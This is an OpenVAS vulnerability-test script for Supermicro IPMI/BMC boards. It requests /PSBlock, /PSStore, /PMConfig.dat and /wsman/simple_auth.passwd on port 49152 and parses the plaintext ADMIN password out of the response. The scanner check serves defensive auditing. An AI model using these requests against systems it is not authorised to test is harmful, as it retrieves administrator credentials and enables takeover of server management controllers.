###############################################################################
# OpenVAS Vulnerability Test
#
# Supermicro IPMI/BMC Plaintext Password Disclosure
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105049");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("2020-08-24T15:18:35+0000");

  script_name("Supermicro IPMI/BMC Plaintext Password Disclosure");

  script_xref(name:"URL", value:"http://blog.cari.net/carisirt-yet-another-bmc-vulnerability-and-some-added-extras/");

  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2014-06-20 18:08:51 +0200 (Fri, 20 Jun 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 49152);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to obtain sensitive information
that may aid in further attacks");
  script_tag(name:"vuldetect", value:"Send a HTTP GET request and check the response.");
  script_tag(name:"insight", value:"BMCs in Supermicro motherboards contain a binary file that stores
remote login passwords in clear text. This file could be retrieved by requesting
/PSBlock on port 49152");
  script_tag(name:"solution", value:"Ask the vendor for an update.");
  script_tag(name:"summary", value:"Supermicro IPMI/BMC Plaintext Password Disclosure");
  script_tag(name:"affected", value:"Motherboards manufactured by Supermicro");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

include("dump.inc");

function get_pass( data )
{
  if( ! data ) return FALSE;

  off = stridx( data, "ADMIN" );
  pass = eregmatch( pattern:"^([[:print:]]+)", string: substr( data, off + 5 + 11 ) );

  if( isnull( pass[1] ) ) return FALSE;

  return pass[1];

}

port = http_get_port( default:49152 );

url = '/IPMIdevicedesc.xml';
req = http_get( item:url, port:port );
buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

if( "supermicro" >!< buf ) exit( 99 );

urls = make_list( '/PSBlock', '/PSStore', '/PMConfig.dat', '/wsman/simple_auth.passwd' );

foreach url ( urls )
{
  req = http_get( item:url, port:port );
  buf = http_send_recv( port:port, data:req, bodyonly:FALSE );
  if( buf =~ "HTTP/1.. 200" && "ADMIN" >< buf && "octet-stream" >< buf )
  {
    if( pass = get_pass( data:buf ) )
    {
      report = 'By requesting the url ' + url + ' it was possible to retrieve the password "' + pass + '" for the user "ADMIN"';
      expert_info = 'Request:\n' + req + 'Response (hexdump):\n' + hexdump( ddata:substr( buf, 0, 600 ) ) + '[truncated]\n';
      security_message( port:port, data:report, expert_info:expert_info );
      exit( 0 );
    }
  }
}

exit( 99 );
